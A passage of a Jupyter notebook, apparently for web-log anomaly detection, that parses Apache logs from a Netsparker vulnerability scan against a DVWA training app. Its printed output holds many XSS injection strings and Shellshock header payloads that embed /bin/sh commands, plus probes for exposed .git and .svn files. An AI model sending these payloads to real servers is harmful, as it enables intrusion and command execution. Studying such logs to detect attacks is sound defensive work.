{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "def ordenar_grupo(df_grupo):\n",
    "    return df_grupo.sort_values(by='Timestamp:')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Librerias"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import numpy as np\n",
    "import re\n",
    "import seaborn as sns\n",
    "import plotly.express as px\n",
    "import matplotlib.pyplot as plt\n",
    "from sklearn.preprocessing import LabelEncoder\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.cluster import MeanShift, estimate_bandwidth, DBSCAN\n",
    "from sklearn.preprocessing import MinMaxScaler\n",
    "from sklearn.decomposition import PCA\n",
    "from sklearn.ensemble import IsolationForest\n",
    "from sklearn.svm import OneClassSVM\n",
    "from sklearn.metrics import silhouette_score\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Lectura"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Longitud del txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "13853\n"
     ]
    }
   ],
   "source": [
    "cantidad = 0\n",
    "with open('../Datos/Originales/apache-logs.txt', 'r') as archivo:\n",
    "    # Lee cada línea del archivo\n",
    "    for linea in archivo:\n",
    "        # Imprime cada línea\n",
    "        cantidad +=1\n",
    "print(cantidad)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Líneas no coincidentes: 231\n"
     ]
    }
   ],
   "source": [
    "pattern = r'^\"(\\S+) (\\S+) (\\S+) \\[(.*?)\\] \"(\\S+) (\\S+) (\\S+)\" (\\d+) (\\d+) \"([^\"]+)\" \"([^\"]+)\"'\n",
    "\n",
    "valid_data = []\n",
    "invalid_data = []\n",
    "\n",
    "with open('../Datos/Originales/apache-logs.txt', 'r') as file:\n",
    "    for log_line in file:\n",
    "        matches = re.match(pattern, log_line)\n",
    "        if matches:\n",
    "            # Si hay coincidencia con el patrón, agregar a datos válidos\n",
    "            client_ip, ident, auth, timestamp, method, request, hhtp_version, status_code, bytes_sent, referrer, user_agent = matches.groups()\n",
    "            valid_data.append([client_ip, ident, auth, timestamp, method, request, hhtp_version, status_code, bytes_sent, referrer, user_agent])\n",
    "        else:\n",
    "            # Si no hay coincidencia, agregar a datos inválidos\n",
    "            invalid_data.append([log_line.strip()])\n",
    "\n",
    "df = pd.DataFrame(valid_data, columns=['Client IP', 'Ident', 'Auth', 'Timestamp', 'Method', 'Request', 'HTTP Version', 'Status Code', 'Bytes Sent', 'Referrer', 'User Agent'])\n",
    "\n",
    "df_invalid = pd.DataFrame(invalid_data, columns=['Invalid Lines'])\n",
    "\n",
    "print(\"Líneas no coincidentes:\", len(df_invalid))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>Referrer</th>\n",
       "      <th>User Agent</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:05 +0300</td>\n",
       "      <td>GET</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>2020</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>263</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.git/config</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.git/config</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/all-wcprops</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       Client IP Ident Auth                   Timestamp Method  \\\n",
       "0  192.168.4.164     -    -  22/Dec/2023:15:19:05 +0300    GET   \n",
       "1  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "2  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "3  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "4  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "\n",
       "                  Request HTTP Version Status Code Bytes Sent Referrer  \\\n",
       "0                  /DVWA/     HTTP/1.1         200       2020        -   \n",
       "1                  /DVWA/     HTTP/1.1         200        263        -   \n",
       "2       /DVWA/.git/config     HTTP/1.1         404        139        -   \n",
       "3       /DVWA/.git/config     HTTP/1.1         404        139        -   \n",
       "4  /DVWA/.svn/all-wcprops     HTTP/1.1         404        139        -   \n",
       "\n",
       "                                          User Agent  \n",
       "0  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "1  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "2  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "3  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  \n",
       "4  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...  "
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Existen líneas que no siguen el mismo patrón, así que las leeremos a parte"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\"192.168.4.164 - - [22/Dec/2023:15:19:15 +0300] \"GET /DVWA/ HTTP/1.1\" 200 1964 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000008)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:15 +0300] \"GET /DVWA/ HTTP/1.1\" 200 1964 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000009)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:15 +0300] \"GET /DVWA/ HTTP/1.1\" 200 1964 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000006)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:15 +0300] \"GET /DVWA/ HTTP/1.1\" 200 1964 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000007)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:18 +0300] \"GET /DVWA/dvwa/ HTTP/1.1\" 200 675 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:18 +0300] \"GET /DVWA/dvwa/ HTTP/1.1\" 200 675 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000022)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:18 +0300] \"GET /DVWA/dvwa/ HTTP/1.1\" 200 675 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000023)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:18 +0300] \"GET /DVWA/dvwa/ HTTP/1.1\" 200 675 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000020)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:18 +0300] \"GET /DVWA/dvwa/ HTTP/1.1\" 200 675 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000021)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:19 +0300] \"GET /DVWA/dvwa/js/ HTTP/1.1\" 200 660 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:20 +0300] \"GET /DVWA/dvwa/js/ HTTP/1.1\" 200 660 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00003C)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:20 +0300] \"GET /DVWA/dvwa/js/ HTTP/1.1\" 200 660 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00003D)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:20 +0300] \"GET /DVWA/dvwa/js/ HTTP/1.1\" 200 660 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00003A)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:20 +0300] \"GET /DVWA/dvwa/js/ HTTP/1.1\" 200 660 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00003B)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:21 +0300] \"GET /DVWA/dvwa/images/ HTTP/1.1\" 200 762 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:21 +0300] \"GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1\" 200 706 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:21 +0300] \"GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1\" 200 706 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000056)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:21 +0300] \"GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1\" 200 706 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000057)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:21 +0300] \"GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1\" 200 706 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000054)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:21 +0300] \"GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1\" 200 706 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000055)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:22 +0300] \"GET /DVWA/dvwa/images/ HTTP/1.1\" 200 762 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000070)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:22 +0300] \"GET /DVWA/dvwa/images/ HTTP/1.1\" 200 762 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000071)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:22 +0300] \"GET /DVWA/dvwa/images/ HTTP/1.1\" 200 762 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00006E)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:22 +0300] \"GET /DVWA/dvwa/images/ HTTP/1.1\" 200 762 \"'\\\"--></style></scRipt><scRipt>netsparker(0x00006F)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:23 +0300] \"GET /DVWA/dvwa/css/ HTTP/1.1\" 200 700 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:23 +0300] \"GET /DVWA/dvwa/css/ HTTP/1.1\" 200 700 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00008A)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:23 +0300] \"GET /DVWA/dvwa/css/ HTTP/1.1\" 200 700 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x00008B)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:23 +0300] \"GET /DVWA/dvwa/css/ HTTP/1.1\" 200 700 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000088)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:23 +0300] \"GET /DVWA/dvwa/css/ HTTP/1.1\" 200 700 \"'\\\"--></style></scRipt><scRipt>netsparker(0x000089)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:23 +0300] \"GET /DVWA/dvwa/css/main.css HTTP/1.1\" 200 1374 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/dvwa/css/main.css HTTP/1.1\" 200 1374 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0000A4)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/dvwa/css/main.css HTTP/1.1\" 200 1374 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0000A5)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/dvwa/css/main.css HTTP/1.1\" 200 1374 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000A2)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/dvwa/css/main.css HTTP/1.1\" 200 1374 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000A3)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/instructions.php HTTP/1.1\" 200 1396 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/setup.php HTTP/1.1\" 200 1561 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/vulnerabilities/ HTTP/1.1\" 200 813 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0000C2)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/vulnerabilities/ HTTP/1.1\" 200 813 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000C0)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:24 +0300] \"GET /DVWA/vulnerabilities/ HTTP/1.1\" 200 813 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000C1)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:25 +0300] \"GET /DVWA/vulnerabilities/ HTTP/1.1\" 200 813 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:25 +0300] \"GET /DVWA/vulnerabilities/ HTTP/1.1\" 200 813 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0000C3)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:32 +0300] \"GET /DVWA/vulnerabilities/brute/ HTTP/1.1\" 200 1709 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:32 +0300] \"GET /DVWA/vulnerabilities/brute/ HTTP/1.1\" 200 1764 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0000DC)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:32 +0300] \"GET /DVWA/vulnerabilities/brute/ HTTP/1.1\" 200 1764 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000DA)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:32 +0300] \"GET /DVWA/vulnerabilities/brute/ HTTP/1.1\" 200 1764 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000DB)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:33 +0300] \"GET /DVWA/instructions.php HTTP/1.1\" 200 1451 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0000EA)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:33 +0300] \"GET /DVWA/instructions.php HTTP/1.1\" 200 1451 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000E8)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:33 +0300] \"GET /DVWA/instructions.php HTTP/1.1\" 200 1451 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000E9)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:33 +0300] \"GET /DVWA/setup.php HTTP/1.1\" 200 1616 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000E4)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:33 +0300] \"GET /DVWA/vulnerabilities/brute/ HTTP/1.1\" 200 1764 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0000DD)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:34 +0300] \"GET /DVWA/instructions.php HTTP/1.1\" 200 1451 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x0000EB)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:34 +0300] \"GET /DVWA/setup.php HTTP/1.1\" 200 1616 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000106)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:34 +0300] \"GET /DVWA/setup.php HTTP/1.1\" 200 1616 \"'\\\"@--></style></scRipt><scRipt>netsparker(0x000107)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:34 +0300] \"GET /DVWA/setup.php HTTP/1.1\" 200 1616 \"'\\\"--></style></scRipt><scRipt>netsparker(0x0000E5)</scRipt>\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
      "\"192.168.4.164 - - [22/Dec/2023:15:19:34 +0300] \"GET /DVWA/vulnerabilities/exec/ HTTP/1.1\" 200 1709 \"() { :;}; echo \\\"NS:\\\" $(/bin/sh -c \\\"expr 268409241 - 2\\\")\" \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36\"\"\n",
